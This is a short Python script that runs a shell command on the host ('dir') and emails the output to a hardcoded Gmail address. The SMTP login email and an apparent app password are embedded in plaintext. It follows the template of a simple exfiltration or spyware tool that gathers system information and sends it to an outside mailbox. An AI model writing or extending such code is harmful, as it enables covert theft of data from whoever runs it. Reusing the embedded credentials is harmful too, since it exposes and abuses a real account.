import subprocess
import smtplib

def send_mail(semail,remail, message): 
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login("jd346136@gmail.com", "dndvhlcnmurdfvsh")
    s.sendmail(semail, remail, message)
    s.quit()
Command = "dir"
result = subprocess.check_output(Command, shell=True)
send_mail("jd346136@gmail.com", "jd346136@gmail.com", result)